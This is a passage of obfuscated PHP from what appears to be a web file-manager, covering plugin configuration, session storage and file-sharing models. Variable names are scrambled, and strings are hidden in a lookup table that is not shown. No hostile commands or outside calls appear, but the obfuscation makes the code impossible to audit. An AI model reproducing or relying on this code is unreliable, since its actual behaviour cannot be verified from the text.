$ãÀÁ¾‡ä[1987]); } $this->update($Ë„æÀÒÎ[$ãÀÁ¾‡ä[399]], array($ãÀÁ¾‡ä[1988] => $Ìø¡İñ)); } public function appRegist($”üÅ¨ğ‰, $ö …ëûç) { $ÃÇÊóÆ =& $_SERVER[ì™ı‰º¯]; $û™¾¨ëœ = $this->loadList($”üÅ¨ğ‰); if ($û™¾¨ëœ) { $this->update($û™¾¨ëœ[$ÃÇÊóÆ[399]], array($ÃÇÊóÆ[1980] => $ö …ëûç)); } else { $ğœ†Áí¡ = array($ÃÇÊóÆ[32] => $”üÅ¨ğ‰, $ÃÇÊóÆ[1980] => $ö …ëûç, $ÃÇÊóÆ[745] => 0, $ÃÇÊóÆ[6] => $this->getConfigDefault($”üÅ¨ğ‰)); $this->insert($ğœ†Áí¡); } } public function getConfigDefault($²å¹ÄŒ–) { $¤º‚ ¤ =& $_SERVER[ì™ı‰º¯]; $Çï  »ì = array(); $şâüıµˆ = $this->getPackageJson($²å¹ÄŒ–); if (!$şâüıµˆ && is_array($şâüıµˆ[$¤º‚ ¤[1989]])) { return $Çï  »ì; } foreach ($şâüıµˆ[$¤º‚ ¤[1989]] as $Î÷ÅØü§ => $¡ò÷ŠŒã) { if (!isset($¡ò÷ŠŒã[$¤º‚ ¤[374]]) || isset($Çï  »ì[$Î÷ÅØü§])) { continue; } $Çï  »ì[$Î÷ÅØü§] = $¡ò÷ŠŒã[$¤º‚ ¤[374]]; } return $Çï  »ì; } public function getPackageJson($²ïĞ¿£) { return Hook::apply($²ïĞ¿£ . $_SERVER[ì™ı‰º¯][1990]); } public function getConfig($Ìô¯†¥°, $²Ã…°Ş‰ = false) { $À×°¤í£ =& $_SERVER[ì™ı‰º¯]; $”À«ŞÅ™ = array(); $¼Ñ„››î = $this->loadList($Ìô¯†¥°); if ($¼Ñ„››î && is_array($¼Ñ„››î[$À×°¤í£[6]])) { $”À«ŞÅ™ = $¼Ñ„››î[$À×°¤í£[6]]; } if (!$”À«ŞÅ™ || $²Ã…°Ş‰) { $”À«ŞÅ™ = $this->getConfigDefault($Ìô¯†¥°); } return $”À«ŞÅ™; } public function setConfig($ªêÚÊèŞ, $ğì÷ÊÂ = false) { $È‡êô³Ÿ =& $_SERVER[ì™ı‰º¯]; $À“í‹®Ò = $this->loadList($ªêÚÊèŞ); if (!$À“í‹®Ò) { return !1; } $öœšİóò = $À“í‹®Ò[$È‡êô³Ÿ[6]]; if ($ğì÷ÊÂ == !1) { $öœšİóò = array(); $ğì÷ÊÂ = $this->getConfigDefault($ªêÚÊèŞ); } foreach ($ğì÷ÊÂ as $ıÁø×’ => $‡¸‰å‹÷) { $öœšİóò[$ıÁø×’] = is_string($‡¸‰å‹÷) ? trim($‡¸‰å‹÷) : $‡¸‰å‹÷; } $this->update($À“í‹®Ò[$È‡êô³Ÿ[399]], array($È‡êô³Ÿ[6] => $öœšİóò)); } public function viewList() { $ì‘Åİ§Ø =& $_SERVER[ì™ı‰º¯]; $Ş¸–©ƒ« = $this->loadList(); $this->pluginScan($Ş¸–©ƒ«); $Ş¸–©ƒ« = $this->loadPluginList(); $‰ûŠ´‚ = array(); foreach ($Ş¸–©ƒ« as $€›İøâŠ => $î€¤¯¶ñ) { unset($î€¤¯¶ñ[$ì‘Åİ§Ø[1980]], $î€¤¯¶ñ[$ì‘Åİ§Ø[6]]); $åé½‹¼Å = PLUGIN_DIR . $î€¤¯¶ñ[$ì‘Åİ§Ø[32]] . $ì‘Åİ§Ø[1982]; if (!is_file($åé½‹¼Å)) { continue; } $Š§„ŠŠ› = Hook::apply($î€¤¯¶ñ[$ì‘Åİ§Ø[32]] . $ì‘Åİ§Ø[1990]); if (is_array($Š§„ŠŠ›)) { $‰ûŠ´‚[$€›İøâŠ] = array_merge($î€¤¯¶ñ, $Š§„ŠŠ›); } } return $‰ûŠ´‚; } private function loadPluginList() { $åª‘øÒŠ =& $_SERVER[ì™ı‰º¯]; $êò€á‰‘ = $this->loadList(); if (strtolower(MOD) == $åª‘øÒŠ[1991]) { return $êò€á‰‘; } $–Í¤Üì = Hook::trigger($åª‘øÒŠ[1992], $êò€á‰‘); if ($êò€á‰‘ && !$–Í¤Üì) { die; } return $–Í¤Üì ? $–Í¤Üì : $êò€á‰‘; } private function pluginScan($÷«±å„œ) { $Â§ìô =& $_SERVER[ì™ı‰º¯]; recursion_dir(PLUGIN_DIR, $¨¯à—À, $¹‡®¶àƒ, 0); foreach ($¨¯à—À as $ı‘ÜÕÕ) { $„í‰¿¶ = get_path_this($ı‘ÜÕÕ); if (isset($÷«±å„œ[$„í‰¿¶]) || !file_exists($ı‘ÜÕÕ . $Â§ìô[1993]) || !file_exists($ı‘ÜÕÕ . $Â§ìô[1982])) { continue; } Hook::apply($„í‰¿¶ . $Â§ìô[1987]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\x6d\x5f\163\145\x73\163\x69\x6f\x6e"; public function get($›Ú©›) { $ïŞÊü†û =& $_SERVER[ì™ı‰º¯]; $Çœìˆìı = $this->where(array($ïŞÊü†û[1994] => $›Ú©›))->find(); if (!is_array($Çœìˆìı)) { return !1; } return $Çœìˆìı[$ïŞÊü†û[750]]; } public function set($¨ç¯ó™ã, $æÒşòı, $¬Áİ»ğ = 3600) { $®éÄ¦áÃ =& $_SERVER[ì™ı‰º¯]; $Ë¾‡Ìƒã = array($®éÄ¦áÃ[1994] => $¨ç¯ó™ã, $®éÄ¦áÃ[1898] => $æÒşòı, $®éÄ¦áÃ[1995] => $¬Áİ»ğ + time()); if (Session::get($®éÄ¦áÃ[1996])) { $Ë¾‡Ìƒã[$®éÄ¦áÃ[1670]] = Session::get($®éÄ¦áÃ[1996]); } else { $Ë¾‡Ìƒã[$®éÄ¦áÃ[1670]] = 0; } if ($this->get($¨ç¯ó™ã)) { return $this->where(array($®éÄ¦áÃ[1994] => $¨ç¯ó™ã))->save($Ë¾‡Ìƒã); } else { return $this->add($Ë¾‡Ìƒã, array(), !0); } } public function remove($À³„‚) { return $this->where(array($_SERVER[ì™ı‰º¯][1994] => $À³„‚))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ì™ı‰º¯][1997] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\124\151\x6d\145", "\164\x69\155\145", "\x69\x6e\163\145\x72\x74\x2c\165\x70\144\x61\164\x65", "\146\165\156\x63\164\x69\157\x6e"), array("\143\162\x65\x61\164\145\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\156\x73\145\x72\164", "\x66\x75\156\x63\164\151\157\156"), array("\x6f\x70\164\x69\x6f\156\163", '', "\x69\156\163\x65\x72\164\54\x75\160\x64\x61\x74\145\54\x73\x65\154\x65\x63\164", "\152\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($˜Ö¿Íç¦) { $îÚ»©¾š =& $_SERVER[ì™ı‰º¯]; $îçñìÓ¥ = isset($˜Ö¿Íç¦[0]) ? $˜Ö¿Íç¦[0] : !1; return array($îÚ»©¾š[1998] => array(USER_ID, $îÚ»©¾š[1999]), $îÚ»©¾š[1939] => array($îçñìÓ¥, $îÚ»©¾š[2000])); } protected function listSimple() { $»êÌ¶¡ = array($_SERVER[ì™ı‰º¯][1670] => USER_ID); $ëùØñ¼ = $this->field($this->fieldList)->where($»êÌ¶¡)->select(); return $ëùØñ¼ ? $ëùØñ¼ : array(); } protected function getInfo($¦öó­Ò–, $«è‹º¤ó = false) { $å´èüóî =& $_SERVER[ì™ı‰º¯]; if ($«è‹º¤ó) { return $this->_getShareInfo(array($å´èüóî[593] => $¦öó­Ò–)); } $‹öÅû = $this->cacheFunctionGet($å´èüóî[1941], $¦öó­Ò–); return $‹öÅû; } public function getInfoByHash($’¤ÀêõÃ) { return $this->_getShareInfo(array($_SERVER[ì™ı‰º¯][2001] => $’¤ÀêõÃ)); } public function getInfoByPath($ãò§©†Á) { $ùœÌäÜµ =& $_SERVER[ì™ı‰º¯]; $óêß°Á¬ = array($ùœÌäÜµ[1670] => USER_ID, $ùœÌäÜµ[402] => $ãò§©†Á); return $this->_getShareInfo($óêß°Á¬); } public function getInfoBySourcePath($–ÔÊ„£Á) { $¤½Õ­› =& $_SERVER[ì™ı‰º¯]; $£ö®Ä = array($¤½Õ­›[1670] => USER_ID, $¤½Õ­›[1174] => $–ÔÊ„£Á); return $this->_getShareInfo($£ö®Ä); } private function _getShareInfo($÷ìä¢ñ…) { $Œ÷¹Òá° =& $_SERVER[ì™ı‰º¯]; $«ÅÛ«Ğê = $this->where($÷ìä¢ñ…)->find(); if (!$«ÅÛ«Ğê) { return !1; } $÷ìä¢ñ… = array($Œ÷¹Òá°[593] => $«ÅÛ«Ğê[$Œ÷¹Òá°[593]]); $•¹“òè£ = $Œ÷¹Òá°[2002]; $Æöî´Ï“ = Model($Œ÷¹Òá°[594])->order($Œ÷¹Òá°[399])->field($•¹“òè£)->where($÷ìä¢ñ…)->select(); if ($«ÅÛ«Ğê[$Œ÷¹Òá°[402]] == $Œ÷¹Òá°[198]) { $«ÅÛ«Ğê[$Œ÷¹Òá°[87]] = IO::info($«ÅÛ«Ğê[$Œ÷¹Òá°[1174]]); } else { $«ÅÛ«Ğê[$Œ÷¹Òá°[87]] = Model($Œ÷¹Òá°[1338])->pathInfo($«ÅÛ«Ğê[$Œ÷¹Òá°[402]]); } $«ÅÛ«Ğê[$Œ÷¹Òá°[2003]] = $Æöî´Ï“; return $«ÅÛ«Ğê; } protected function getInfoAuth($éšÑò†Ô) { $›¹¼İë =& $_SERVER[ì™ı‰º¯]; $âô÷Î·Õ = $this->getInfo($éšÑò†Ô); if ($âô÷Î·Õ[$›¹¼İë[1670]] == USER_ID) { $âô÷Î·Õ[$›¹¼İë[413]] = $âô÷Î·Õ[$›¹¼İë[87]][$›¹¼İë[413]]; } else { $âô÷Î·Õ[$›¹¼İë[413]] = Model($›¹¼İë[493])->authMake($âô÷Î·Õ[$›¹¼İë[2003]]); } return $âô÷Î·Õ; } protected function listData($ä®õ¥êÜ = null, $ğ×úÕÓ = 300) { $å§”ÑÜè =& $_SERVER[ì™ı‰º¯]; $ı–‡Äºª = array(array($å§”ÑÜè[488] => array($å§”ÑÜè[1011], 0), $å§”ÑÜè[591] => array($å§”ÑÜè[1011], 0), $å§”ÑÜè[2004] => $å§”ÑÜè[1957])); if ($ä®õ¥êÜ == $å§”ÑÜè[2005]) { $ı–‡Äºª = array($å§”ÑÜè[488] => 1); } else { if ($ä®õ¥êÜ == $å§”ÑÜè[1160]) { $ı–‡Äºª = array($å§”ÑÜè[591] => 1); } } $ı–‡Äºª[$å§”ÑÜè[1670]] = USER_ID; $¥°ïıš¤ = $this->where($ı–‡Äºª)->selectPage($ğ×úÕÓ); return $¥°ïıš¤; } protected function listToMe($’ŠŸŒÕà = 300) { $şÜì¯  =& $_SERVER[ì™ı‰º¯]; $ñº£¼ ” = Model($şÜì¯ [2006])->userGroupParents(USER_ID); $—¦ê®¹— = array($şÜì¯ [576] => SourceModel::TYPE_USER, $şÜì¯ [496] => USER_ID); if ($ñº£¼ ”) { $—¦ê®¹— = array(array($şÜì¯ [576] => SourceModel::TYPE_USER, $şÜì¯ [496] => USER_ID), array($şÜì¯ [576] => SourceModel::TYPE_GROUP, $şÜì¯ [496] => array($şÜì¯ [7], $ñº£¼ ”)), $şÜì¯ [2004] => $şÜì¯ [1957]); } $‡¯Á§¹ê = Model($şÜì¯ [594])->where($—¦ê®¹—)->selectPage($’ŠŸŒÕà); $ËÖ´ï½ = array_to_keyvalue_group($‡¯Á§¹ê[$şÜì¯ [369]], $şÜì¯ [593]); if (!$ËÖ´ï½) { return $‡¯Á§¹ê; } $ôàø£¦ = $şÜì¯ [2007]; $—¦ê®¹— = array($şÜì¯ [593] => array($şÜì¯ [418], array_keys($ËÖ´ï½)), $şÜì¯ [1670] => array($şÜì¯ [1013], $şÜì¯ [198])); $Ò¢£Êğß = $this->field($ôàø£¦)->where($—¦ê®¹—)->select(); foreach ($Ò¢£Êğß as $ß©ı¸ => &$²â²ıáó) { $²â²ıáó[$şÜì¯ [2003]] = $ËÖ´ï½[$²â²ıáó[$şÜì¯ [593]]]; } unset($²â²ıáó); $ş™é²å = array($şÜì¯ [2008] => $Ò¢£Êğß, $şÜì¯ [2009] => $‡¯Á§¹ê[$şÜì¯ [366]]); return $ş™é²å; } protected function shareAdd($Ú¸ĞÇ†ø, $®Éñí÷) { $ïßÅ›¹Ç =& $_SERVER[ì™ı‰º¯]; $‹ÖŠ£“¯ = $this->_addShareData($Ú¸ĞÇ†ø, $®Éñí÷); if (!empty($®Éñí÷[$ïßÅ›¹Ç[2010]])) { $this->_shareAuthSet($‹ÖŠ£“¯, $®Éñí÷[$ïßÅ›¹Ç[2010]]); } $this->shareEventAdd($Ú¸ĞÇ†ø, $®Éñí÷, $ïßÅ›¹Ç[2011]); return $‹ÖŠ£“¯; } protected function shareAddSystem($»è³Ë­û, $¸†¾ü»¥) { $²Û‘À¾õ =& $_SERVER[ì™ı‰º¯]; $Äˆ³–‚œ = $this->_addShareData($»è³Ë­û, $¸†¾ü»¥, $²Û‘À¾õ[1283]); $this->_shareAuthSet($Äˆ³–‚œ, $¸†¾ü»¥[$²Û‘À¾õ[2010]]); return $Äˆ³–‚œ; } private function shareEventAdd($ü±Šıº°, $áéëš¼®, $¹¨ô‘« = "\141\144\144") { $Æâ‰ş• =& $_SERVER[ì™ı‰º¯]; if (!$ü±Šıº° || $ü±Šıº° == $Æâ‰ş•[198]) { return; } if ($¹¨ô‘« == $Æâ‰ş•[2011]) { if ($áéëš¼®[$Æâ‰ş•[488]] == $Æâ‰ş•[88]) { Model($Æâ‰ş•[561])->eventShare($ü±Šıº°, $Æâ‰ş•[2012]); } if ($áéëš¼®[$Æâ‰ş•[591]] == $Æâ‰ş•[88]) { Model($Æâ‰ş•[561])->eventShare($ü±Šıº°, $Æâ‰ş•[2013]); } return; } $’ûùİø¯ = $this->getInfoByPath($ü±Šıº°); $â¸£Ò¸— = $Æâ‰ş•[2014]; if ($’ûùİø¯[$Æâ‰ş•[488]] == $Æâ‰ş•[198] && $áéëš¼®[$Æâ‰ş•[488]] == $Æâ‰ş•[88]) { $â¸£Ò¸— = $Æâ‰ş•[2012]; } if ($’ûùİø¯[$Æâ‰ş•[488]] == $Æâ‰ş•[88] && $áéëš¼®[$Æâ‰ş•[488]] == $Æâ‰ş•[198]) { $â¸£Ò¸— = $Æâ‰ş•[2015]; } if ($’ûùİø¯[$Æâ‰ş•[591]] == $Æâ‰ş•[198] && $áéëš¼®[$Æâ‰ş•[591]] == $Æâ‰ş•[88]) { $â¸£Ò¸— = $Æâ‰ş•[2013]; } if ($’ûùİø¯[$Æâ‰ş•[591]] == $Æâ‰ş•[88] && $áéëš¼®[$Æâ‰ş•[591]] == $Æâ‰ş•[198]) { $â¸£Ò¸— = $Æâ‰ş•[2016]; } Model($Æâ‰ş•[561])->eventShare($ü±Šıº°, $â¸£Ò¸—); return; } private function _addShareData($Ğ‡ŒÑÀÍ, $ÍßğÆ±  = array(), $ì¤ÌÔ§¢ = false) { $ÌÂ·´Âõ =& $_SERVER[ì™ı‰º¯]; $Àìúì£ = $ì¤ÌÔ§¢ == $ÌÂ·´Âõ[1283] ? 0 : USER_ID; $ê¦õ€»ã = array($ÌÂ·´Âõ[417] => $Ğ‡ŒÑÀÍ, $ÌÂ·´Âõ[1661] => $Àìúì£); if ($Ğ‡ŒÑÀÍ == 0) { $ê¦õ€»ã = array($ÌÂ·´Âõ[2017] => $ÍßğÆ± [$ÌÂ·´Âõ[1174]], $ÌÂ·´Âõ[1661] => $Àìúì£); } if ($¶Í„æÃÙ = $this->where($ê¦õ€»ã)->find()) { return $¶Í„æÃÙ[$ÌÂ·´Âõ[593]]; } if ($Ğ‡ŒÑÀÍ == 0) { $ëšùÚïÑ = array($ÌÂ·´Âõ[32] => get_path_this($ÍßğÆ± [$ÌÂ·´Âõ[84]])); } else { $ëšùÚïÑ = Model($ÌÂ·´Âõ[821])->sourceInfo($Ğ‡ŒÑÀÍ); if (!$ëšùÚïÑ) { return !1; } } if (!$ÍßğÆ± [$ÌÂ·´Âõ[1569]]) { $ÍßğÆ± [$ÌÂ·´Âõ[1569]] = $ëšùÚïÑ[$ÌÂ·´Âõ[32]]; } $áö§·½ì = array($ÌÂ·´Âõ[1661] => $Àìúì£, $ÌÂ·´Âõ[417] => $Ğ‡ŒÑÀÍ, $ÌÂ·´Âõ[1569] => $ÌÂ·´Âõ[12], $ÌÂ·´Âõ[488] => 0, $ÌÂ·´Âõ[591] => 0, $ÌÂ·´Âõ[1174] => $ÌÂ·´Âõ[12], $ÌÂ·´Âõ[307] => $ÌÂ·´Âõ[12], $ÌÂ·´Âõ[888] => $ÌÂ·´Âõ[12], $ÌÂ·´Âõ[2018] => 0, $ÌÂ·´Âõ[2019] => 0, $ÌÂ·´Âõ[757] => 0, $ÌÂ·´Âõ[2020] => $ÌÂ·´Âõ[12], $ÌÂ·´Âõ[2001] => $ÌÂ·´Âõ[12]); $¸¤ÜŒé = explode($ÌÂ·´Âõ[50], $ÌÂ·´Âõ[2021]); foreach ($¸¤ÜŒé as $‚‚œˆˆù) { if (!isset($ÍßğÆ± [$‚‚œˆˆù])) { continue; } $áö§·½ì[$‚‚œˆˆù] = $ÍßğÆ± [$‚‚œˆˆù]; } $·¾’ìç¿ = $this->add($áö§·½ì); $ªï™»¡¶ = array($ÌÂ·´Âõ[2001] => short_id($·¾’ìç¿)); $this->where(array($ÌÂ·´Âõ[2022] => $·¾’ìç¿))->save($ªï™»¡¶); return $·¾’ìç¿; } private function _shareAuthSet($À©‡Ãìú, $‘›àÊÅÒ) { $«ÌÆé°â =& $_SERVER[ì™ı‰º¯]; if (!is_array($‘›àÊÅÒ)) { return !1; } $œ»Í¢à• = Model($«ÌÆé°â[1967]); $œ»Í¢à•->where(array($«ÌÆé°â[593] => $À©‡Ãìú))->delete(); $©£¡Œ¢û = array(); foreach ($‘›àÊÅÒ as $‚¬Ù –) { $ÃˆËíÂ• = SourceModel::TYPE_USER; if ($‚¬Ù –[$«ÌÆé°â[411]] == SourceModel::TYPE_GROUP) { $ÃˆËíÂ• = SourceModel::TYPE_GROUP; } $‘Ò‡ıÎ = array($«ÌÆé°â[593] => $À©‡Ãìú, $«ÌÆé°â[411] => $ÃˆËíÂ•, $«ÌÆé°â[496] => intval($‚¬Ù –[$«ÌÆé°â[496]]), $«ÌÆé°â[1963] => 0, $«ÌÆé°â[2023] => -1); if ($‚¬Ù –[$«ÌÆé°â[1963]]) { $‘Ò‡ıÎ[$«ÌÆé°â[1963]] = $‚¬Ù –[$«ÌÆé°â[1963]]; } else { if ($‚¬Ù –[$«ÌÆé°â[2023]]) { $‘Ò‡ıÎ[$«ÌÆé°â[2023]] = $‚¬Ù –[$«ÌÆé°â[2023]]; } } $©£¡Œ¢û[] = $‘Ò‡ıÎ; } return $œ»Í¢à•->addAll($©£¡Œ¢û, array(), !0); } public function numViewAdd($È±úì„É) { $èÅ­µâé =& $_SERVER[ì™ı‰º¯]; $ÇÍÎîõ = array($èÅ­µâé[2022] => $È±úì„É); $this->where($ÇÍÎîõ)->setAdd($èÅ­µâé[2018]); } public function numDownloadAdd($à‹ıçåä) { $ÀÅØÄ· =& $_SERVER[ì™ı‰º¯]; $ÇìĞÌÌÆ = array($ÀÅØÄ·[2022] => $à‹ıçåä); $this->where($ÇìĞÌÌÆ)->setAdd($ÀÅØÄ·[2019]); } protected function shareEdit($˜¢ßçÃ, $Á¯È£’„) { $Ñœıí²Ì =& $_SERVER[ì™ı‰º¯]; $¹õ‡”õò = $this->getInfo($˜¢ßçÃ); if (!$¹õ‡”õò) { return !1; } $this->_checkLinkShare($Á¯È£’„, $¹õ‡”õò); $øãÜåØ± = array(); $µòëù³Í = explode($Ñœıí²Ì[50], $Ñœıí²Ì[2024]); foreach ($µòëù³Í as $ÕÏÈ¨×æ) { if (!array_key_exists($ÕÏÈ¨×æ, $Á¯È£’„)) { continue; } $øãÜåØ±[$ÕÏÈ¨×æ] = $Á¯È£’„[$ÕÏÈ¨×æ]; } $this->shareEventAdd($¹õ‡”õò[$Ñœıí²Ì[402]], $Á¯È£’„, $Ñœıí²Ì[1829]); $this->where(array($Ñœıí²Ì[2022] => $˜¢ßçÃ))->save($øãÜåØ±); if (isset($Á¯È£’„[$Ñœıí²Ì[2010]])) { $this->_shareAuthSet($˜¢ßçÃ, $Á¯È£’„[$Ñœıí²Ì[2010]]); } return !0; } private function _checkLinkShare($ÇÒÛ³æ¹, $ ±Ñ²) { $ö½›èµ± =& $_SERVER[ì™ı‰º¯]; if ($ÇÒÛ³æ¹[$ö½›èµ±[488]] != $ö½›èµ±[88]) { return; } $”˜Â”° = $ ±Ñ²[$ö½›èµ±[87]][$ö½›èµ±[402]]; if ($ ±Ñ²[$ö½›èµ±[87]][$ö½›èµ±[33]] != $ö½›èµ±[200]) { $Ñˆ«ì  = $this->_folderReport($”˜Â”°); if (!$Ñˆ«ì ) { return; } show_json(LNG($ö½›èµ±[2025]) . $ö½›èµ±[2026] . $Ñˆ«ì , !1); } $ÀÕçÍ“ì = Model($ö½›èµ±[821])->fileInfoGet($ ±Ñ²[$ö½›èµ±[87]][$ö½›èµ±[402]]); if (!$ÀÕçÍ“ì) { return; } $æíŠÄİ = $this->shareFileMeta($ÀÕçÍ“ì[$ö½›èµ±[468]]); if (isset($æíŠÄİ[$ö½›èµ±[374]]) && $æíŠÄİ[$ö½›èµ±[374]] == $ö½›èµ±[88]) { show_json(LNG($ö½›èµ±[2027]), !1); } } private function _folderReport($öó¯ãùØ) { $¾ÓÙİİË =& $_SERVER[ì™ı‰º¯]; $‹¯•€À = array($¾ÓÙİİË[468] => array($¾ÓÙİİË[1011], 0), $¾ÓÙİİË[745] => 3); $ã¦Ó¾Ÿ› = Model($¾ÓÙİİË[2028])->where($‹¯•€À)->field($¾ÓÙİİË[468])->select(); if (!$ã¦Ó¾Ÿ›) { return !1; } $ã¦Ó¾Ÿ› = array_to_keyvalue($ã¦Ó¾Ÿ›, $¾ÓÙİİË[12], $¾ÓÙİİË[468]); $¿ ƒ¹…Å = $¾ÓÙİİË[50] . $öó¯ãùØ . $¾ÓÙİİË[50]; $‹¯•€À = array($¾ÓÙİİË[468] => array($¾ÓÙİİË[7], $ã¦Ó¾Ÿ›), $¾ÓÙİİË[511] => array($¾ÓÙİİË[383], "\45{$¿ ƒ¹…Å}\x25"), $¾ÓÙİİË[431] => 0); $Œ©äÏÆ… = Model($¾ÓÙİİË[821])->where($‹¯•€À)->field($¾ÓÙİİË[2029])->find(); if (!$Œ©äÏÆ…) { return !1; } $­³ëÔ = substr($Œ©äÏÆ…[$¾ÓÙİİË[511]], strpos($Œ©äÏÆ…[$¾ÓÙİİË[511]], $¿ ƒ¹…Å)); $‹¯•€À = array($¾ÓÙİİË[402] => array($¾ÓÙİİË[7], trim($­³ëÔ, $¾ÓÙİİË[50]))); $ÊîéÓŞæ = Model($¾ÓÙİİË[821])->where($‹¯•€À)->field($¾ÓÙİİË[32])->select(); $›ıÖØ¸ñ = array_to_keyvalue($ÊîéÓŞæ, $¾ÓÙİİË[12], $¾ÓÙİİË[32]); $›ıÖØ¸ñ[] = $Œ©äÏÆ…[$¾ÓÙİİË[32]]; return implode($¾ÓÙİİË[8], $›ıÖØ¸ñ); } protected function remove($éíüÁµ) { $ÂëÅ“¿ =& $_SERVER[ì™ı‰º¯]; if (is_array($éíüÁµ)) { $éíüÁµ = array($ÂëÅ“¿[7], $éíüÁµ); } $â¥Šôåá = array($ÂëÅ“¿[593] => $éíüÁµ); $ø«Å¢àŒ = $this->where($â¥Šôåá)->delete(); if ($ø«Å¢àŒ) { Model($ÂëÅ“¿[594])->where(array($ÂëÅ“¿[593] => $éíüÁµ))->delete(); } $·‹„ã’• = is_array($éíüÁµ) ? $éíüÁµ[1] : array($éíüÁµ); for ($’—Ì­¨ö = 0; $’—Ì­¨ö < count($·‹„ã’•); $’—Ì­¨ö++) { $ƒ˜Îº¹ı = $this->getInfo($·‹„ã’•[$’—Ì­¨ö]); if ($ƒ˜Îº¹ı[$ÂëÅ“¿[591]] == $ÂëÅ“¿[88]) { Model($ÂëÅ“¿[561])->eventShare($ƒ˜Îº¹ı[$ÂëÅ“¿[402]], $ÂëÅ“¿[2016]); } if ($ƒ˜Îº¹ı[$ÂëÅ“¿[488]] == $ÂëÅ“¿[88]) { Model($ÂëÅ“¿[561])->eventShare($ƒ˜Îº¹ı[$ÂëÅ“¿[402]], $ÂëÅ“¿[2015]); } } return $ø«Å¢àŒ; } protected function removeBySource($àÍÕÎÕÍ) { $òòøÕÑÌ =& $_SERVER[ì™ı‰º¯]; $—ëñ¸–™ = array($òòøÕÑÌ[417] => array($òòøÕÑÌ[418], $àÍÕÎÕÍ)); $ı…‰ãŸ = $this->field($òòøÕÑÌ[593])->where($—ëñ¸–™)->select(); $ı…‰ãŸ = array_to_keyvalue($ı…‰ãŸ, $òòøÕÑÌ[12], $òòøÕÑÌ[593]); if (!$ı…‰ãŸ) { return; } $—ëñ¸–™ = array($òòøÕÑÌ[2022] => array($òòøÕÑÌ[418], $ı…‰ãŸ)); $this->where($—ëñ¸–™)->delete(); Model($òòøÕÑÌ[594])->where($—ëñ¸–™)->delete(); } public function listAll($ƒ›ºŞŸ) { $áµ¯ Ú¢ =& $_SERVER[ì™ı‰º¯]; $ÜŒš³Öº = array(); if ($ƒ›ºŞŸ[$áµ¯ Ú¢[1670]]) { $ÜŒš³Öº[$áµ¯ Ú¢[1670]] = $ƒ›ºŞŸ[$áµ¯ Ú¢[1670]]; } if ($ƒ›ºŞŸ[$áµ¯ Ú¢[756]]) { $†ùÈÕÍä = $ƒ›ºŞŸ[$áµ¯ Ú¢[757]] ? $ƒ›ºŞŸ[$áµ¯ Ú¢[757]] : strtotime(date($áµ¯ Ú¢[2030])); $ÜŒš³Öº[$áµ¯ Ú¢[201]] = array($áµ¯ Ú¢[333], array($ƒ›ºŞŸ[$áµ¯ Ú¢[756]], $†ùÈÕÍä)); } if ($ƒ›ºŞŸ[$áµ¯ Ú¢[33]]) { $ÜŒš³Öº[$ƒ›ºŞŸ[$áµ¯ Ú¢[33]]] = 1; } else { $ÜŒš³Öº[] = array($áµ¯ Ú¢[488] => array($áµ¯ Ú¢[1011], 0), $áµ¯ Ú¢[591] => array($áµ¯ Ú¢[1011], 0), $áµ¯ Ú¢[2004] => $áµ¯ Ú¢[1957]); } if ($ƒ›ºŞŸ[$áµ¯ Ú¢[1953]]) { $ÜŒš³Öº[] = array($áµ¯ Ú¢[2001] => $ƒ›ºŞŸ[$áµ¯ Ú¢[1953]], $áµ¯ Ú¢[1569] => array($áµ¯ Ú¢[383], "\x25{$ƒ›ºŞŸ[$áµ¯ Ú¢[1953]]}\45"), $áµ¯ Ú¢[2004] => $áµ¯ Ú¢[1957]); } $®ì³áŸí = $this->_makeOrder()->where($ÜŒš³Öº)->selectPage(20); if (empty($®ì³áŸí[$áµ¯ Ú¢[369]])) { return array(); } $this->_listDataApply($®ì³áŸí[$áµ¯ Ú¢[369]]); return $®ì³áŸí; } public function listDataApply($¼ï»½´×) { $this->_listDataApply($¼ï»½´×); return $¼ï»½´×; } private function _listDataApply(&$£É•¦) { $Â’êîáß =& $_SERVER[ì™ı‰º¯]; $úÌŒ·Ù­ = array_to_keyvalue($£É•¦, $Â’êîáß[12], $Â’êîáß[1670]); $–´ÕØæ· = Model($Â’êîáß[525])->userListInfo(array_unique($úÌŒ·Ù­)); $“íßæ¿š = array_to_keyvalue($£É•¦, $Â’êîáß[12], $Â’êîáß[402]); $À„ıºø = Model($Â’êîáß[821])->sourceListInfo($“íßæ¿š, !0); foreach ($£É•¦ as $Â°§Ş— => &$„§äëÁ­) { $ÓÆßº¹ö = $„§äëÁ­[$Â’êîáß[1670]]; $„§äëÁ­[$Â’êîáß[2031]] = $–´ÕØæ·[$ÓÆßº¹ö] ? $–´ÕØæ·[$ÓÆßº¹ö] : !1; $Â’Ò¦˜ = $„§äëÁ­[$Â’êîáß[402]]; $„§äëÁ­[$Â’êîáß[87]] = $À„ıºø[$Â’Ò¦˜] ? $À„ıºø[$Â’Ò¦˜] : !1; if ($„§äëÁ­[$Â’êîáß[87]][$Â’êîáß[431]] == $Â’êîáß[88]) { unset($£É•¦[$Â°§Ş—]); } if ($„§äëÁ­[$Â’êîáß[87]] != $Â’êîáß[198] && !$„§äëÁ­[$Â’êîáß[87]]) { unset($£É•¦[$Â°§Ş—]); } } unset($„§äëÁ­); $£É•¦ = array_values($£É•¦); } private function _makeOrder($Ù°‹şÊ = '') { $ßµ§ªûÁ =& $_SERVER[ì™ı‰º¯]; $©šõœ = array($ßµ§ªûÁ[201], $ßµ§ªûÁ[757], $ßµ§ªûÁ[2018], $ßµ§ªûÁ[2019]); $‚¦£ñÅ« = array($ßµ§ªûÁ[450] => $ßµ§ªûÁ[451], $ßµ§ªûÁ[452] => $ßµ§ªûÁ[453]); $“ĞãŞğ› = Input::get($ßµ§ªûÁ[457], $ßµ§ªûÁ[7], $ßµ§ªûÁ[423], $©šõœ); $Á¤ŠÏ—… = Input::get($ßµ§ªûÁ[458], $ßµ§ªûÁ[7], $ßµ§ªûÁ[2032], array($ßµ§ªûÁ[1950], $ßµ§ªûÁ[452])); $Á¤ŠÏ—… = $‚¦£ñÅ«[$Á¤ŠÏ—…]; $Ù°‹şÊ = $Ù°‹şÊ . "{$“ĞãŞğ›}\40{$Á¤ŠÏ—…}"; return $this->order($Ù°‹şÊ); } public function reportAdd($™©ú€äö) { $·“¥ò =& 